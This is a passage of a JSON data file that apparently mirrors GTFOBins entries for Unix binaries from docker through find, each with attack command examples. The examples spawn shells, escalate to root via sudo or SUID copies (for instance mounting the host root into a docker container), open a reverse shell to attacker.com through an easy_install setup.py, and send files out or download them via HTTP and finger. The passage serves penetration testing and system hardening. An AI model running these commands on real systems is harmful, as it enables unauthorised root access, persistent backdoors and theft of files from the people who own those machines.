                        "code": "CONTAINER_ID=\"$(docker run -d alpine)\" # or existing\nTF=$(mktemp)\necho \"DATA\" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF file_to_write"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "Read a file by copying it to a temporary container and back to a new location on the host.",
                        "code": "CONTAINER_ID=\"$(docker run -d alpine)\"  # or existing\nTF=$(mktemp)\ndocker cp file_to_read $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF $TF\ncat $TF"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "The resulting is a root shell.",
                        "code": "sudo install -m =xs $(which docker) .\n\n./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "The resulting is a root shell.",
                        "code": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "dpkg",
        "url": "https://gtfobins.github.io/gtfobins/dpkg/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "dpkg -l\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "sudo dpkg -l\n!/bin/sh"
                    },
                    {
                        "description": "It runs an interactive shell using a specially crafted Debian package. Generate it with fpm and upload it to the target.",
                        "code": "TF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF"
                    }
                ]
            }
        ]
    },
    {
        "name": "dstat",
        "url": "https://gtfobins.github.io/gtfobins/dstat/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "dstat allows you to run arbitrary python scripts loaded as “external plugins” if they are located in one of the directories stated in the dstat man page under “FILES”:\n\n\t1. ~/.dstat/\n\t2. (path of binary)/plugins/\n\t3. /usr/share/dstat/\n\t4. /usr/local/share/dstat/\n\nPick the one that you can write into."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "mkdir -p ~/.dstat\necho 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >~/.dstat/dstat_xxx.py\ndstat --xxx"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx"
                    }
                ]
            }
        ]
    },
    {
        "name": "dvips",
        "url": "https://gtfobins.github.io/gtfobins/dvips/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The texput.dvi output file produced by tex can be created offline and uploaded to the target."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\ndvips -R0 texput.dvi"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which dvips) .\n\ntex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\n./dvips -R0 texput.dvi"
                    }
                ]
            }
        ]
    },
    {
        "name": "dmsetup",
        "url": "https://gtfobins.github.io/gtfobins/dmsetup/",
        "functions": [
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which dmsetup) .\n\n./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'"
                    }
                ]
            }
        ]
    },
    {
        "name": "easy_install",
        "url": "https://gtfobins.github.io/gtfobins/easy_install/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\neasy_install $TF"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\neasy_install $TF"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
                        "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\neasy_install $TF"
                    },
                    {
                        "description": "Serve files in the local folder running an HTTP server.",
                        "code": "export LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\neasy_install $TF"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request. The file path must be absolute.",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', '$(whereis python)', '-c', \\\"\\\"\\\"import sys;\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve('$URL', '$LFILE')\\\"\\\"\\\")\" > $TF/setup.py\npip install $TF"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file path must be absolute.",
                        "code": "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', 'python', '-c', 'open(\\\"$LFILE\\\",\\\"w+\\\").write(\\\"DATA\\\")')\" > $TF/setup.py\neasy_install $TF"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The read file content is wrapped within program messages.",
                        "code": "TF=$(mktemp -d)\necho 'print(open(\"file_to_read\").read())' > $TF/setup.py\neasy_install $TF"
                    }
                ]
            },
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\neasy_install $TF"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF"
                    }
                ]
            }
        ]
    },
    {
        "name": "eb",
        "url": "https://gtfobins.github.io/gtfobins/eb/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This invokes the default logging service, which is likely to be journalctl, other functions may apply. For this to work the target must be connected to AWS instance via EB-CLI."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "eb logs\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo eb logs\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "ed",
        "url": "https://gtfobins.github.io/gtfobins/ed/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ed\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "ed file_to_write\na\nDATA\n.\nw\nq"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "ed file_to_read\n,p\nq"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ed) .\n\n./ed file_to_read\n,p\nq"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ed\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ed) .\n\n./ed\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "elvish",
        "url": "https://gtfobins.github.io/gtfobins/elvish/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "elvish"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "export LFILE=file_to_write\nelvish -c 'echo DATA >$E:LFILE'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "export LFILE=file_to_read\nelvish -c 'echo (slurp <$E:LFILE)'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which elvish) .\n\n./elvish"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo elvish"
                    }
                ]
            }
        ]
    },
    {
        "name": "efax",
        "url": "https://gtfobins.github.io/gtfobins/efax/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The content is actually parsed by the command, thus it may not be suitable for reading arbitrary files."
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which efax) .\n\nLFILE=file_to_read\n./efax -d \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo efax -d \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "emacs",
        "url": "https://gtfobins.github.io/gtfobins/emacs/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "emacs -Q -nw --eval '(term \"/bin/sh\")'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "emacs file_to_write\nDATA\nC-x C-s"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "emacs file_to_read"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which emacs) .\n\n./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
                    }
                ]
            }
        ]
    },
    {
        "name": "enscript",
        "url": "https://gtfobins.github.io/gtfobins/enscript/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "enscript /dev/null -qo /dev/null -I '/bin/sh >&2'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'"
                    }
                ]
            }
        ]
    },
    {
        "name": "env",
        "url": "https://gtfobins.github.io/gtfobins/env/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "env /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which env) .\n\n./env /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo env /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "eqn",
        "url": "https://gtfobins.github.io/gtfobins/eqn/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\neqn \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which eqn) .\n\nLFILE=file_to_read\n./eqn \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo eqn \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "espeak",
        "url": "https://gtfobins.github.io/gtfobins/espeak/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The file content appears in the middle of other textual information, thus it might not be suitable to read arbitray binary files."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nespeak -qXf \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which espeak) .\n\nLFILE=file_to_read\n./espeak -qXf \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo espeak -qXf \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "exiftool",
        "url": "https://gtfobins.github.io/gtfobins/exiftool/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "If the permissions allow it, files are moved (instead of copied) to the destination."
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nINPUT=input_file\nexiftool -filename=$LFILE $INPUT"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nOUTPUT=output_file\nexiftool -filename=$OUTPUT $LFILE\ncat $OUTPUT"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT"
                    }
                ]
            }
        ]
    },
    {
        "name": "ex",
        "url": "https://gtfobins.github.io/gtfobins/ex/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ex\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "ex file_to_write\na\nDATA\n.\nw\nq"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "ex file_to_read\n,p\nq"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ex\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "expect",
        "url": "https://gtfobins.github.io/gtfobins/expect/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "expect -c 'spawn /bin/sh;interact'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file is read and parsed as an expect command file, the content of the first invalid line is returned in an error message. Thus, this might not be suitable to read arbitrary binary files.",
                        "code": "LFILE=file_to_read\nexpect $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which expect) .\n\n./expect -c 'spawn /bin/sh -p;interact'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo expect -c 'spawn /bin/sh;interact'"
                    }
                ]
            }
        ]
    },
    {
        "name": "expand",
        "url": "https://gtfobins.github.io/gtfobins/expand/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The read file content is corrupted by replacing tabs with spaces."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nexpand \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which expand) .\n\nLFILE=file_to_read\n./expand \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo expand \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "facter",
        "url": "https://gtfobins.github.io/gtfobins/facter/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nFACTERLIB=$TF facter"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter"
                    }
                ]
            }
        ]
    },
    {
        "name": "file",
        "url": "https://gtfobins.github.io/gtfobins/file/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "Each input line is treated as a filename for the file command and the output is corrupted by a suffix : followed by the result or the error of the operation, so this may not be suitable for binary files.",
                        "code": "LFILE=file_to_read\nfile -f $LFILE"
                    },
                    {
                        "description": "Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.",
                        "code": "LFILE=file_to_read\nfile -m $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "Each input line is treated as a filename for the file command and the output is corrupted by a suffix : followed by the result or the error of the operation, so this may not be suitable for binary files.",
                        "code": "sudo install -m =xs $(which file) .\n\nLFILE=file_to_read\n./file -f $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "Each input line is treated as a filename for the file command and the output is corrupted by a suffix : followed by the result or the error of the operation, so this may not be suitable for binary files.",
                        "code": "LFILE=file_to_read\nsudo file -f $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "finger",
        "url": "https://gtfobins.github.io/gtfobins/finger/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "finger hangs waiting for the remote peer to close the socket."
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send a binary file to a TCP port. Run sudo nc -l -p 79 | base64 -d > \"file_to_save\" on the attacker box to collect the file. The file length is limited by the maximum size of arguments.",
                        "code": "RHOST=attacker.com\nLFILE=file_to_send\nfinger \"$(base64 $LFILE)@$RHOST\""
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch remote binary file from a remote TCP port. Run base64 \"file_to_send\" | sudo nc -l -p 79 on the attacker box to send the file.",
                        "code": "RHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "find",
        "url": "https://gtfobins.github.io/gtfobins/find/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "find . -exec /bin/sh \\; -quit"
                    }
                ]
            },
            {
                "function": "File write",
